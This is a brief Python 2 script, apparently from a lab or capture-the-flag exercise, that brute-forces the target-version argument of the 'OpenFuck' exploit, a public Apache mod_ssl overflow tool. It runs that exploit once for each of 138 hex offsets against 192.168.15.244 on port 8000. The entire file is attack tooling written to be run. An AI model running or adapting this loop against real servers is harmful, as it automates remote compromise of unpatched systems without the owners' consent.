#!/usr/bin/python

from subprocess import call

# openfuck loop script
# Stephen Krings

#hex(version)

for i in xrange(138):
	form = "0x{:02x}".format(i)
	call(["./OpenFuck", form, "192.168.15.244", "8000"])
